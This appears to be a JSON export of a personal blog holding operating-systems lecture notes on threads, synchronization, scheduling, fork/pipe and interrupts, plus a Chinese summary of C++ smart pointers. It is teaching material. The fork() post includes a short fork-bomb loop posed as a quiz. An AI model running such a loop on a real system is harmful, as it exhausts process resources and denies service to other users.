following code do? 1234567891011121314151617181920nt main(int argc, void * argv) &#123; int i, restored = 0; jump_buf saved; for (i = 0; i &lt; 10; i++) &#123; printf(\"Value of i is now %d\\n\", i); if (i == 5) &#123; printf(\"OK, saving state...\\n\"); if (setjmp(saved) == 0) &#123; printf(\"Saved CPU state.\\n\"); break; &#125; else &#123; printf(\"Restored CPU state.\\n\"); restored = 1; &#125; &#125; &#125; if (!restored) &#123; longjmp(saved, 1); &#125;&#125; 12345678910111213Value of i is now 0Value of i is now 1Value of i is now 2Value of i is now 3Value of i is now 4Value of i is now 5OK, saving state...Saved CPU state.Restored CPU state.Value of i is now 6Value of i is now 7Value of i is now 8Value of i is now 9 Use these tricks to impress your (new) friends! (Or get rid of old ones…​) Comparing Threading ImplementationsM:1 (user space) threading Pros: Threading operations are much faster because they do not have to cross the user/kernel boundary. Thread state can be smaller. Cons: Can’t use multiple cores! Operating system may not schedule the application correctly because it doesn’t know about the fact that it contains more than one thread. A single thread may block the entire process in the kernel when there are other threads that could run. 1:1 (kernel) threadingPros: Scheduling might improve because kernel can schedule all threads in the process. Cons: Context switch overhead for all threading operations.","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"Introduction to Synchronization","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-4-Introduction-to-Synchronation/","text":"Fast Forward: SynchronizationWhat you need to know The OS creates the illusion of concurrency by quickly switching the processor(s) between multiple threads We will back up and discuss how this happens after discussion synchronization Threads are used to abstract and multiplex the CPU Pandora’s Concurrency BoxThe illusion of concurrency is both powerful and useful: It helps us think about how to structure our applications. It hides latencies caused by slow hardware devices. Unfortunately, concurrency also creates problems: Coordination: how do we enable efficient communication between the multiple threads involved in performing a single task? Correctness: how do we ensure that shared state remains consistent when being accessed by multiple threads concurrently? How do we enforce time-based semantics? We will focus on correctness today but return to coordination later. Patient 0The operating system itself is one of the most difficult concurrent programs to write. Why? It is multiplexing access to hardware resources and therefore sharing a great deal of state between multiple processes! It frequently uses many threads to hide hardware delays while servicing devices and application requests. Lots of shared state plus lots of threads equals a difficult synchronization problem. Also, if the operating system gets synchronization wrong bad things happen. Concurrency v. ParallelismThe Go developers have a great description of this distinction. According to them: …​when people hear the word concurrency they often think ofparallelism, a related but quite distinct concept. In programming,concurrency is the composition of independently executing processes,while parallelism is the simultaneous execution of (possibly related)computations. Concurrency is about dealing with lots of things atonce. Parallelism is about doing lots of things at once. Watch the video to find out more. Unless Shown Otherwise…​Concurrency forces us to relax any assumptions that we may want to make about how any particular thread executes. Unless explicitly synchronized, threads may: Be run in any order, Be stopped and restarted at any time, Remain stopped for arbitrary lengths of time. Generally these are good things — the operating system is making choices about how to allocate resources. When accessing shared data these are challenges that force us to program more carefully. Race ConditionsA race condition is “when the output of a process is unexpectedly dependent on timing or other events.” Note that the definition of a race depends on what we expected to happen: We expected me to have $4,000 after both deposits. (Otherwise we are not observing the Law of the Conversation of Money, probably important to banks except during bailouts.) Concurrency v. AtomicityConcurrency: the illusion that multiple things are happening at once. Requires stopping or starting any thread at any time. Atomicity: the illusion that a set of separate actions occurred all at once. Requires not stopping certain threads at certain times or not starting certain threads at certain times, i.e. providing some limited control to threads over their scheduling. Critical SectionsA critical section(临界区) contains a series of instructions that only one thread can be executing at any given time. This set (or sets) of instructions will look atomic with respect to other threads executing code within the critical section. 1234567void giveGWATheMoolah(account_t account, int largeAmount) &#123; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); notifyGWAThatHeIsRich(gwaHas); return;&#125; In order to implement the previous example correctly: What is local state private to each thread? gwaHas What is the shared state that is being accessed by giveGWATheMoolah? account What lines are in the critical section? 2-4 Critical Section Requirements Mutual Exclusion: this is the most basic property. Only one thread should be executing in the critical section at one time. Progress: all threads should eventually be able to proceed through the critical section. Performance: we want to keep critical sections as small as possible without sacrificing correctness.","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"Introduction to scheduling","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-10-Introduction-to-scheduling/","text":"Thread StatesWe talk about threads—and sometimes the processes containing them—as being in several different states: Running: executing instructions on a CPU core. Ready: not executing instructions but capable of being restarted. Waiting, Blocked or Sleeping: not executing instructions and not able to be restarted until some event occurs. Thread State Transitions Running → Ready: a thread was descheduled. Running → Waiting: a thread performed a blocking system call. Waiting → Ready: the event the thread was waiting for happened. Ready → Running: a thread was scheduled. Running → Terminated: a thread exited or hit a fatal exception. Operating systems have data structures to organize threads into these groups which you encountered during ASST1. Scheduling: What?What is scheduling? Scheduling is the process of choosing the next thread (or threads) to run on the CPU (or CPUs). We will primarily discuss single core scheduling for most of the week but return to multi-core scheduling issues later. Scheduling: Why?Why schedule threads? CPU multiplexing: we have more threads that cores to run them on. Kernel privilege: we are in charge of allocating the CPU and must try to make good decisions. Applications rely on it. Scheduling: When?When does scheduling happen? When a thread voluntarily gives up the CPU by calling yield(). When a thread makes a blocking system call and must sleep until the call completes. When a thread exits. When the kernel decides that a thread has run for long enough. #4 is what makes a scheduling policy preemptive, as opposed to cooperative: the kernel can preempt (or stop) a thread that has not requested to be stopped. Why yield()?What is the rationale behind having a way for threads to voluntarily give up the CPU? yield() can be a useful way of allowing a well-behaved thread to tell the CPU that it has no more useful work to do. yield() is inherently cooperative. “Let me get out of the way so that another, more useful, thread can run.” Scheduling: How?Two separate questions here: Mechanism: how do we switch between threads? Policy: how do we choose the next thread to run? How do we switch between threads? Perform a context switch and move threads between the ready, running, and waiting queues. Policy v. MechanismScheduling is as example of useful separation between policy and mechanism: P: deciding what thread to run. M: context switch. M: maintaining the running, ready and waiting queues. P: giving preference to interactive tasks. M: using timer interrupts to stop running threads. P: choosing a thread to run at random. Scheduling MattersHow the CPU is scheduled impacts every other part of the system. Why? Using other system resources requires the CPU! Intelligent scheduling makes a modestly-powered system seem fast and responsive. Stupid scheduling makes a powerful system seem sluggish and laggy. Human-Computer Interaction (and Expectations)What do you expect from your machine? Respond (Click) Continue (Watch, or active waiting) Finish (Expect, or passive waiting) Respond (Click)Responsiveness: when you give the computer and instruction, or input, it responds in a timely manner. It may not finish, but at least you know it has started (or understood). Most of what we do with computers consists of responsive tasks. This is using a computer, and what makes computers different from television. Examples of responsive tasks: Web browsing: when a link is clicked, retrieve the web page. Editing: when I enter text at the keyboard, place it at the cursor. Chatting: when I hit send, transmit the text to my chat partner. Continue (Watch)Continuity: when you ask the computer to perform a continuous task it does so smoothly. Continuity implies active waiting: you are not interacting with the computer, but you are expecting it to continue to perform a task you have initiated. As computers have started to deliver media, this function is increasingly important. Examples of continuous tasks: Blinking a cursor. Playing music or a movie. Stupid (!) web animations. Finish (Expect)Completion: when we ask to the computer to perform a task—or it performs one on our behalf—that we expect to take a long time, we want it to complete eventually. Completion implies passive waiting: you are asking the computer to continue to deliver interactive performance while working on your long-running task. (We also consider these background tasks.) Unlike responsive and continuous task, background tasks may not be user initiated. Examples of background tasks: Performing a system backup. Indexing files on my computer. Click, Watch, ExpectMany applications combine all three system expectations. Music player: Click: change tracks. Watch: play the selected track. Finish: update album artwork. Web browser: Click: follow a link. Watch: play web video. Finish: index search history. Conflicting GoalsScheduling is a balance between meeting deadlines and optimizing resource allocation: Optimal resource allocation: carefully allocate tasks so that all resources are constantly in used. Meeting deadlines: drop everything and do this now! Responsiveness and continuity require meeting deadlines—unpredictable or predictable: Responsiveness → unpredictable deadlines. “When the user moves the mouse I need to be ready to redraw the cursor.” Continuity → predictable deadlines. “Every 5 ms I need to write more data to the sound card buffer.” Throughput requires careful resource allocation: Throughput → optimal resource allocation. “I should really give the backup process more resources so that it can finish overnight.” Deadlines WinHumans are sensitive to responsiveness and continuity. We don’t notice resource allocation (as much). Heard: “My computer feels slow.” Unheard: “My computer is not using all of its RAM.” Why: Poor responsiveness or continuity wastes our time! (“The mouse jumped all over and I couldn’t click anywhere.”, “The movie kept stalling and I couldn’t watch it.”) Poor throughput usually just wastes computer time. (“The backup took 12 hours but I was sleeping.”) Scheduling Goals(Or, how to evaluate schedulers.) How well does it meet deadlines—unpredictable or predictable? How completely does it allocate system resources? No point having idle CPU, memory, or disk bandwidth when something useful could be happening. On human-facing systems, deadlines (or interactivity) usually wins. Why? Your time is more valuable than your computer’s. (Aside) Realtime SchedulingWe have established that deadlines are important to human-facing systems. This is mainly because systems that don’t meet deadlines are annoying. (“Buffering…​”, “Buffering…​”, etc.) There are other classes of systems where the failure to meet deadlines can be fatal. “I meant to get around to running the motion_stop task 1 s ago, but I didn’t quite make it. And…​the robot rolled off of the cliff.","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"fork() and pipe()","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-3-fork-and-pipe/","text":"fork() and pipe()Process CreationWhere do processes come from? fork() create a new processfork() is the UNIX system call that creates a new process. fork() creates a new process that is a copy of the calling process. After fork() we refer to the caller as the parent and the newly-created process as the child. This relationship enables certain capabilities. fork() Semantics Generally fork() tries to make an exact copy of the calling process. Recent version of UNIX have relaxed this requirement and there are now many flavors of fork() that copy different amounts of state and are suitable for different purposes. For the purposes of this class, ignore them. Threads are a notable exception! fork() Against Threads Single-threaded fork() has reliable semantics because the only thread the processes had is the one that called fork(). So nothing else is happening while we complete the system call. Multi-threaded fork() creates a host of problems that many systems choose to ignore. Linux will only copy state for the thread that called fork(). Multi-Threaded fork()There are two major problems with multi-threaded fork() Another thread could be blocked in the middle of doing something (uniprocessor systems), or another thread could be actually doing something (multiprocessor systems). This ends up being a big mess. Let’s just copy the calling thread. fork() fork() copies one thread—​the caller. fork() copies the address space. fork() copies the process file table. After fork()123456returnCode = fork();if (returnCode == 0) &#123; # I am the child.&#125; else &#123; # I am the parent.&#125; The child thread returns executing at the exact same point that its parent called fork(). With one exception: fork() returns twice, the PID to the parent and 0 to the child. All contents of memory in the parent and child are identical. Both child and parent have the same files open at the same position.* **But, since they are sharing file handles changes to the file offset made by the parent/child will be reflected in the child/parent!** Calm Like A fork() bombWhat does this code do? 123while (1) &#123; fork();&#125; PipesChains of communicating processes can be created by exploiting the pipe() system call. pipe() creates an anonymous pipe object and returns a two file descriptors: one for the read-only end, and the other for the write-only end. Anything written to the write-only end of the pipe is immediately available at the read-only end of the pipe. Pipe contents are buffered in memory. Why is this useful? IPC Using fork() and pipe() Before calling fork() the parent creates a pipe object by calling pipe(). Next, it calls fork(). After fork() the parent closes its copy of the read-only end and the child closes its copy of the write-only end. Now the parent can pass information to the child. pipeEnds[0] gets the read end; pipeEnds[1] gets the write end. 1234567891011121314151617181920212223# pipeEnds[0] gets the read end; pipeEnds[1] gets the write end.int pipeEnds[2];pipe(pipeEnds);int returnCode = fork();if (returnCode == 0) &#123; # Don't need a loopback. close(pipeEnds[1]); # Read some data from the pipe. char data[14]; read(pipeEnds[0], data, 14);&#125; else &#123; # Don't need a loopback. close(pipeEnds[0]); # Write some data to the pipe. write(pipeEnds[1], \"Hello, sweet child!\\n\", 14);&#125; Issues with fork()Copying all that state is expensive! Especially when the next thing that a process frequently does is to start load a new binary which destroys most of the state fork() has carefully copied! Several solutions to this problem: Optimize existing semantics: through copy-on-write, a clever memory-management optimization we will discuss in several weeks. Change the semantics: vfork(), which will fail if the child does anything other than immediately load a new executable. Does not copy the address space! What if I don’t want to copy all of my process state? fork() is now replaced by clone(), a more flexible primitive that enables more control:* over sharing, including sharing memory, and signal handlers, * and over child execution, which begins at a function pointer passed to the system call instead of resuming at the point where fork() was called. Try man clone in your CSE421 VM. The Tree of Life fork() establishes a parent-child relationship between two process at the point when each one is created. The pstree utility allows you to visualize these relationships.","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"C++ Primer (12) - 动态内存","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/C-C-Primer-12-动态内存-C-Primer-12-动态内存C-Primer-12-动态内存/","text":"C++ 支持动态分配对象。动态对象的正确释放是编程中及其容易出错的地方。 程序使用动态内存处于以下三种原因之一： 程序不知道自己需要使用多少对象 程序不知道所需对象的准确类型 程序需要在多个对象间共享数据 12.1 动态内存智能指针动态内存的管理是通过new和delete来完成的： new：分配空间，并返回一个指向该对象的指针 delete：销毁对象，释放关联的内存 动态内存的使用非常容易出现问题，C++标准库提供了智能指针(smart pointer)来管理动态对象(定义在memory头文件中)： shared_ptr: 允许多个指针指向同一个对象 unique_ptr: 独占所指向的对象 weak_ptr: 指向shared_ptr所管理的对象的弱引用 12.1.1 shard_ptr类默认初始化的智能指针中保存着一个空指针。shared_ptr支持的操作： shared_ptr&lt;T&gt; sp 空智能指针，可以指向类型为T的对象 p 将p用作一个条件判断，若p指向一个对象，则为true *p 解引用p，获得它指向的对象 p-&gt;mem 等价于 (*p).mem p.get() 返回p中保存的指针。 swap(p, q), p.swap(q) 交换p和q中的指针 make_shared&lt;T&gt;(args) 返回一个shared_ptr, 指向一个动态分配的类型为T的对象。使用args初始化此对象 shared_ptr&lt;T&gt;p(q) p是q的拷贝 p=q p和q都是shared_ptr，所保存的指针必须能相互转换。此造作会递减p的引用计数，递增q的引用计数；若p的引用计数变为0，则将其管理的原内存释放 每个shard_ptr都有一个引用计数，以下情况计数器会递增： 拷贝一个shared_ptr 用一个shared_ptr初始化另一个shared_ptr(注：传值时拷贝) 把shared_ptr作为参数传递给一个函数 shared_ptr作为函数的返回值 以下情况，引用计数递减 给shared_ptr赋予一个新值 shared_ptr被销毁 一旦一个shared_ptr引用计数为0，它就会自动释放自己所管理的对象。 12.1.2 直接管理内存C++通过new和delete来直接管理内存。 传递给delete的指针必须指向动态分配的内存或者一个空指针。也就是说一般的指针是不可以的。 使用new和delete管理动态内存存在三个常见问题： 内存泄漏(memory leak)：忘记delete内存 使用已经释放的对象 同一块内存释放两次 空悬指针(dangling pointer)：在delete之后，指针值变为无效，但指针仍然保存着已经释放了的动态内存的地址。可以在离开其作用于之前释放掉它所关联的内存，或者赋予nullptr值。 12.1.3 shared_ptr和new结合使用接受指针参数的智能指针构造函数是explicit的，因此我们不能将一个内置指针隐式转换为一个智能指针，智能使用直接初始化形式来初始化一个智能指针： 12shared_ptr&lt;int&gt; p1 = new int(1024); // errorshared_ptr&lt;int&gt; p2(new int(1024); //correct 注：两种初始化 拷贝初始化(copy initialization)： 使用=初始化一个变量 直接初始化(direct initialization)： 不使用= 12.1.5 unique_ptr一个unique_ptr”拥有”它所指向的对象。与shared_ptr不同，某个时刻只能有一个unique_ptr指向一个给定对象。当unique_ptr被销毁时，它所指向的对象也被销毁。 类似shared_ptr，初始化unique_ptr必须采用直接初始化形式： 12unique_ptr&lt;double&gt; p1; // 可以指向一个double的unique_ptrunique_ptr&lt;int&gt; p2(new int(42)); //指向一个值为42的int 由于一个unique_ptr拥有它指向的对象，因此unique_ptr不支持普通的拷贝或赋值操作。 unique_ptr操作： unique_ptr&lt;T&gt; u1: 空unique_ptr, 可以指向类型为T的对象。u1会使用delete来释放它的指针。 unique_ptr&lt;T, D&gt; u2: u2会使用一个类型为D的可调用对象来释放它的指针。 unique_ptr&lt;T, D&gt; u(d): 空unique_ptr，指向类型为T的对象，用类型为D的对象d代替delete u=nullptr：释放u指向的对象，将u置为空 u.release(): u放弃对指针的控制权，返回指针，并将u置为空 u.reset():释放u指向的对象 u.reset(q)，u.reset(nullptr): 如果提供了内置指针q，令u指向这个对象；否则将u置为空。 release只是放弃了对指针的控制权，也就是切断unique_ptr和它原来管理的对象间的联系，并没有释放指向的内存。 12.1.6 weak_ptrweak_ptr指向由一个shared_ptr管理的对象。将一个weak_ptr绑定到一个shared_ptr不会改变shared_ptr的引用计数。 weak_ptr操作： weak_ptr&lt;T&gt; w： 空weak_ptr可以指向类型为T的对象 weak_ptr&lt;T&gt; w(sp)：与shared_ptr sp指向相同对象的weak_ptr。T必须能转换为sp指向的类型 w=p: p可以是一个shared_ptr或一个weak_ptr。赋值后w与p共享对象 w.reset()：将w置为空 w.use_count():与w共享对象的shared_ptr的数量 w.expired():若w.use_count()为0，返回true，否则返回false w.lock()：如果expired为true，返回一个空的shared_ptr；否则返回一个指向w的对象的shared_ptr. weak_ptr主要用于解决上面提到的空悬指针(dangling pointer)问题。一般几乎不可能知道指针所指向的内存是否已经释放。通过shared_ptr的expired和lock操作，用户能够检查内存释放[1]。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;memory&gt;int main()&#123; // OLD, problem with dangling pointer // PROBLEM: ref will point to undefined data! int* ptr = new int(10); int* ref = ptr; delete ptr; // NEW // SOLUTION: check expired() or lock() to determine if pointer is valid // empty definition std::shared_ptr&lt;int&gt; sptr; // takes ownership of pointer sptr.reset(new int); *sptr = 10; // get pointer to data without taking ownership std::weak_ptr&lt;int&gt; weak1 = sptr; // deletes managed object, acquires new pointer sptr.reset(new int); *sptr = 5; // get pointer to new data without taking ownership std::weak_ptr&lt;int&gt; weak2 = sptr; // weak1 is expired! if(auto tmp = weak1.lock()) std::cout &lt;&lt; *tmp &lt;&lt; '\\n'; else std::cout &lt;&lt; \"weak1 is expired\\n\"; // weak2 points to new data (5) if(auto tmp = weak2.lock()) std::cout &lt;&lt; *tmp &lt;&lt; '\\n'; else std::cout &lt;&lt; \"weak2 is expired\\n\";&#125; 12.2 动态数组12.2.2 allocator类allocator是C++标准类库，用来分配未构造的内存。 allocator分配的内存是未构造的(unconstructed)。为了使用allocate返回的内存，必须用construct构造对象。使用未构造的内存，其行为是未定义的。 标准库allocator类及其算法： allocator&lt;T&gt; a： 定义了一个名为a的allocator对象，它可以为类型为T的对象分配内存 a.allocate(n)：分配一段原始的、未构造的内存，保存n个类型为T的对象 a.deallocate(p, n)：释放从T*指针p中地址开始的内存，这块内存保存了n个类型为T的对象；p必须是一个先前由allocate返回的指针，且n必须是p创建时所要求的大小。在调用deallocate之前，用户必须对每个在这块内存中创建的对象调用destory。 a.construct(p, args): p必须是一个类型为T*的指针，指向一块原始内存；arg被传递给类型为T的构造函数，用来在p指向的内存中构造一个对象。 a.destroy(p): p为T*类型的指针，此算法对p指向的对象执行析构函数。 除了construct，还可以用uninitialized_copy和uninitialized__fill在未初始化内存中创建对象。 copy与uninitialized_copy的不同见[2]。 reference When is std:weak_ptr useful? Difference between std::uninitialized_copy &amp; std::copy?","tags":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/tags/C/"},{"name":"Memory","slug":"Memory","permalink":"http://larryim.cc/tags/Memory/"}],"categories":[{"name":"C++","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"Interrupt and Exception Handling","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-7-Interrupt-and-Exception-Handling/","text":"Our Simple Shell12345678910/* Disclaimer: this is C-like pseudo-code. It will not compile or run! (But it’s not far off.) */while (1) &#123; input = readLine(); returnCode = fork(); if (returnCode == 0) &#123; exec(input); &#125;&#125; exec() ChallengesThe most challenging part of exec() is making sure that, on failure, exec() can return to the calling process! Can’t make destructive changes to the parent’s address space until we are sure that things will success. Of course, the process is just an abstraction anyway and that provides a lot of flexibility: can prepare a separate address space and just swap it in when we’re done. exit() # End of Life Issues What’s missing here? Death! Processes choose the moment of their own end by calling exit(). As we discussed earlier a processes passes an exit code to the exit() function. What happens to this exit code? wait() # The Afterlife When a process calls exit() the kernel holds the exit code, which can be retrieved by the exiting child’s parent. The parent retrieves this exit code by calling wait(), the last of the primary process-related system calls. And the one that stubbornly refuses to fit into my lifecycle metaphor. wait()/exit() We often consider wait() and exit() together, since they combine to remove any trace of a process from the system. Until a process both calls exit() and has its exit code collected via wait() traces of it remain on the system: Its return code is retained by the kernel. Its process ID (or PID) is also retained. Why? Processes that have exit()ed but not had their exit code collected are called zombies. (Ooh, scary!) wait()/exit() also present an interesting synchronization problem you will solve for ASST2. Calls to wait() (by the parent) and exit() (by the child) may interleave in the kernel. You must guarantee that the parent can retrieve the exit code successfully. wait()/exit() Issues What happens if a process’s parent exits before it does? The “orphaned” process is assigned the init process as a parent, which will collect its exit code when it exits. Referred to as reparenting. How do we prevent zombies from taking over the machine? A processes parent receives the SIGCHLD signal when a child calls exit(), alerting it to the chance to retrieve the child’s exit status. On some systems a process can choose to have its children automatically reaped by ignoring this signal. On bash the relevant command is the appropriately-named disown. This allows children to continue running as daemons even after bash exits. What If I Don’t Want to wait()? Parent may want to peek at the exit status of its child, just to check on it. (Are you dead yet? Are you dead yet?) Systems support a non-blocking wait() for this purpose: Blocking wait() will block until the child exits, unless it has already exited in which case it returns immediately. Non-Blocking wait() will not block. Instead, its return status indicates if the child has exited and, if so, what the exit code was. Our Simple Shell Disclaimer: this is C-like pseudo-code. It will not compile or run! (But it’s not far off.) 123456789while (1) &#123; input = readLine(); returnCode = fork(); if (returnCode == 0) &#123; exec(input); &#125; else &#123; wait(returnCode); &#125;&#125; Aside: errnoWhere’s exit()? There is potential confusion between kernel system calls and wrappers implemented by libc: _exit() (system call) v. exit() (C library function call). The C library wraps system calls and changes their return codes. The C library is what sets errno, not the kernel. Multiplexing and Abstracting the CPUFor the next several weeks we’ll be looking at how the operating system manages the processor: What are the limitations or problems with the hardware resource that the operating system is trying to address? There is only one (or at least, no that many) processor(s)! What are the mechanisms necessary to allow the processor to be shared? Interrupts and context switching. What are the consequences for programmers of processor multiplexing? Concurrency and synchronization. How do we design good policies ensuring that processor sharing meets the needs of the user? Processor scheduling. Today: Operating System Privilege Earlier we alluded to the fact that the operating system is like a normal program with some special privileges. In fact, implementing most of the process-related system calls we discussed last week does not require these special privileges! If you don’t believe me, look at user-space threading libraries. They provide functionality very similar to the fork(), exec(), exit() and wait() system calls we discussed. So why does the operating system need special privileges? Multiplexing Requires Privilege In many cases implementing abstractions does not require special privileges. However, the operating systems other task—multiplexing resources— does. In order to divide resources between processes the system needs a trusted and privileged entity that can: divide the resources, and enforce the division. No Trusto Processo Why can’t processes share resources without a privileged arbiter? Some processes are: malicious—“Hey, I’d like some more memory, so I’ll use yours!” buggy—“Um, is this my memory or your memory? I’m not sure but I’ll just use it and hope things turn out OK…​” Privileged Execution CPUs implement a mechanism allowing the operating system to manage resources: kernel (or privileged) mode. Being in kernel mode may mean that the executing code has access to special instructions, and has a different view of memory. Special Instructions When the CPU is in kernel mode there are special instructions that can be executed. These instructions usually modify important global state controlling how resources are shared. When the CPU is not in kernel mode it does not allow these instructions to be executed. We will see what happens when an unprivileged process tries to execute a privileged instruction in a minute. Protection Boundaries The goal: only trusted kernel code runs in kernel mode; untrusted user code always runs in user mode. The CPU implements mechanisms to transition between user and kernel mode which we will discuss during the rest of today’s class. Aside: Fine-Grained Protection Many modern CPUs implement more than two protection modes. x86 processors actually have four protection “rings” from Ring 0 (most privileged) to Ring 3 (least privileged). For many years operating systems running on x86 architectures only used Ring 0 (kernel mode) and Ring 3 (user mode). Recently this has become more interesting because of operating system virtualization, so we will return to this. But for now, you can think of processors as having two privilege modes: kernel mode and user mode. Terminology When we say “application“ we refer to code running without privileges or in unprivileged or “user” mode. When we say “kernel“ we mean code running in privileged or kernel mode. What makes the kernel special? It is the one application allowed to executed code in kernel mode! Bootstrapping PrivilegeWhy is the operating system allowed to run in kernel mode? You installed your machine that way! This is what it means to install an operating system: choose a particular application to grant special privileges to. On boot the CPU starts out executing the kernel code in privileged mode, which is how privilege is bootstrapped. The kernel is responsible for lowering the privilege level before executing user code. More Terminology: Traps When a normal application does something that causes the system to enter kernel mode we sometimes refer to this as trapping into the kernel. I frequently think about the thread that trapped into the kernel as running in the kernel after the trap occurs. On some level this is accurate: it is the same stream of instructions. On some level this is not accurate: the kernel thread has its own stack and has saved the state of the trapping user thread, so in a way the user thread has been paused while the kernel performs some task on its behalf. Decide the way to think about this that is the most effective for you. Privilege Transitions The transition into the kernel or into privileged mode typically occurs for one of three reasons: a hardware device requests attention—hardware interrupt software requests attention—software interrupt or system call software needs attention—software exception What is the difference between requesting and needing attention? Hardware Interrupts Hardware interrupts are used to signal that a particular device needs attention: a disk read completed, or a network packet was received, or a timer fired. Processors implement multiple interrupt lines, input wires on which a logic transition (or level) will trigger an interrupt. Interrupt HandlingWhen an interrupt is triggered (interrupt request, or IRQ), the processor: enters privileged mode, records state necessary to process the interrupt, jumps to a pre-determined memory location and begins executing instructions. The instructions that the processor executes when an interrupt fires are called the interrupt service routine (ISR).","tags":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/tags/OS/"}],"categories":[{"name":"OS","slug":"OS","permalink":"http://larryim.cc/categories/OS/"},{"name":"CSE521","slug":"OS/CSE521","permalink":"http://larryim.cc/categories/OS/CSE521/"}]},{"title":"Synchronization Primitives","date":"2017-07-29T16:00:00.000Z","path":"2017/07/30/OS-CSE521-5-Synchronation-Primitive/","text":"Synchronization primitives(同步原语) are simple software mechanisms provided by a platform (e.g. operating system) to its users for the purposes of supporting thread or process synchronization. They’re usually built using lower level mechanisms (e.g. atomic operations, memory barriers, spinlocks, context switches etc)[1]. primitive or atomic action 是由若干个机器指令构成的完成某种特定功能的一段程序，具有不可分割性·即原语的执行必须是连续的，在执行过程中不允许被中断[2]。 Implementing Critical Sections Two possible approaches. Don’t stop, or don’t enter. On uniprocessors a single thread can prevent other threads from executing in a critical section by simply not being descheduled. In the kernel we can do this by masking interrupts. No timer, no scheduler, no stopping. In the multicore era this is only of historical interest. (This design pattern is usually broken.) More generally we need a way to force other threads—potentially running on other cores—not to enter the critical section while one thread is inside. How do we do this? Atomic InstructionsSoftware synchronization primitives utilize special hardware instructions guaranteed to be atomic across all cores: Test-and-set: write a memory location and return its old value. 12345int testAndSet(int * target, int value) &#123; oldvalue = *target; *target = value; return oldvalue;&#125; Compare-and-swap: compare the contents of a memory location to a given value. If they are the same, set the variable to a new given value. 12345678bool compareAndSwap(int * target, int compare, int newvalue) &#123; if (*target == compare) &#123; *target = newvalue; return 1; &#125; else &#123; return 0; &#125;&#125; Load-link and store-conditional: Load-link returns the value of a memory address, while the following store-conditional succeeds only if the value has not changed since the load-link. 123456789101112y = 1;__asm volatile( \".set push;\" /* save assembler mode */ \".set mips32;\" /* allow MIPS32 instructions */ \".set volatile;\" /* avoid unwanted optimization */ \"ll %0, 0(%2);\" /* x = *sd */ \"sc %1, 0(%2);\" /* *sd = y; y = success? */ \".set pop\" /* restore assembler mode */ : \"=r\" (x), \"+r\" (y) : \"r\" (sd));if (y == 0) &#123; return 1;&#125; Many processors provide either test and set or compare and swap. On others equivalents can be implemented in software using other atomic hardware instructions. The Bank Example: Test and SetLet’s modify our earlier example to use a test and set: 1234567void giveGWATheMoolah(account_t account, int largeAmount) &#123; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); notifyGWAThatHeIsRich(gwaHas); return;&#125; 1234567891011+int payGWA = 0; // Shared variable for our test and set.void giveGWATheMoolah(account_t account, int largeAmount) &#123;+ testAndSet(&amp;payGWA, 1); # Set the test and set. int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas);+ testAndSet(&amp;payGWA, 0); # Clear the test and set. notifyGWAThatHeIsRich(gwaHas); return;&#125; Does this work? No! How do I tell if another thread has already set payGWA? Let’s try again: 1234567void giveGWATheMoolah(account_t account, int largeAmount) &#123; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); notifyGWAThatHeIsRich(gwaHas); return;&#125; 12345678910111213+int payGWA = 0; // Shared variable for our test and set.void giveGWATheMoolah(account_t account, int largeAmount) &#123;+ if (testAndSet(&amp;payGWA, 1) == 1) &#123;+ // But then what?+ &#125; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas);+ testAndSet(&amp;payGWA, 0); # Clear the test and set. notifyGWAThatHeIsRich(gwaHas); return;&#125; But what should I do if the payGWA is set? 1234567void giveGWATheMoolah(account_t account, int largeAmount) &#123; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); notifyGWAThatHeIsRich(gwaHas); return;&#125; 12345678910111213+int payGWA = 0; // Shared variable for our test and set.void giveGWATheMoolah(account_t account, int largeAmount) &#123;+ while (testAndSet(&amp;payGWA, 1) == 1) &#123;+ ; // Test it again!+ &#125; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas);+ testAndSet(&amp;payGWA, 0); # Clear the test and set. notifyGWAThatHeIsRich(gwaHas); return;&#125; Busy Waiting The Bank Example: Test and Set12345678910111213int payGWA = 0; // Shared variable for our test and set.void giveGWATheMoolah(account_t account, int largeAmount) &#123; while (testAndSet(&amp;payGWA, 1) == 1) &#123; ; // Test it again! &#125; int gwaHas = get_balance(account); gwaHas = gwaHas + largeAmount; put_balance(account, gwaHas); testAndSet(&amp;payGWA, 0); # Clear the test and set. notifyGWAThatHeIsRich(gwaHas); return;&#125; What are the problems with this approach? Busy waiting: threads wait for the critical section by “pounding on the door”, executing the TAS repeatedly. Bad on a multicore system. Worse on a single core 